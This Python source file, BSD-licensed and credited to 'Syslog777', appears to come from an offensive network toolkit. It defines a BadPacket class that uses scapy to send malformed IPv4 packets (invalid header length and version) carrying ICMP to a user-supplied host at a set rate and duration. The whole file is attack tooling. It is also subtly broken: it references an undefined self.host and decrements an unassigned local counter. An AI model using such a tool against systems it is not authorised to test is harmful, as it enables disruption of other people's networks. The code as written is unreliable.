#!/usr/bin/env python3
"""
 Copyright (c) 2017, Syslog777
 
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without modification,
 are permitted provided that the following conditions are met:
 
     * Redistributions of source code must retain the above copyright notice,
       this list of conditions and the following disclaimer.
     * Redistributions in binary form must reproduce the above copyright notice,
       this list of conditions and the following disclaimer in the documentation
       and/or other materials provided with the distribution.
     * Neither the name of Desktop nor the names of its contributors
       may be used to endorse or promote products derived from this software
       without specific prior written permission.
 
 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""
from scapy.all import *

"""
BadPacket.send() sends one total packet by default
"""


class BadPacket:

    def __init__(self, parser):
        self.parser = parser
        self.parser.add_argument('host', nargs='?',
                                 help='Host to send bad packet(s) to')
        self.parser.add_argument('-pps', '--packets-per-second',
                                 help='Number of packets to send')
        self.parser.add_argument('-ttr', '--time-to-run',
                                 help='Total operation time')
        self.parser.set_defaults(time_to_run=1)
        self.parser.set_defaults(packets_per_second=1)
        self.args = parser.parse_args()
        self.time_to_run = self.args.time_to_run
        self.packets_per_second = self.args.packets_per_second

    def sendPayload(self):
        send(IP(dst=self.host, ihl=2, version=3) / ICMP())

    def send(self):
        while self.time_to_run > 0:
            if not self.args.host:
                print("Host required!")
                self.parser.print_help()
                break
            try:
                while self.time_to_run > 0:
                    self.sendPayload()
                    time_to_run = time_to_run - 1
                    time.sleep(1)
            except KeyboardInterrupt:
                sys.exit(0)
